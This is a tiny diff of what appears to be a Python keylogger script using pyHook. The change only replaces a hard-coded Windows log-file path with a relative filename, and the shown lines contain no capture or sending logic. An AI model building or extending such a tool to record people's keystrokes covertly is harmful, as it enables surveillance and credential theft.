@@ -1,6 +1,6 @@
 import pyHook , pythoncom , sys , logging , time
 
-file_log = 'G:\Python Pratice\keylogger_log_file.txt'
+file_log = 'keylogger_log_file.txt'
 
 file_log += time.strftime("%d. %m. %Y") + ".txt"
 
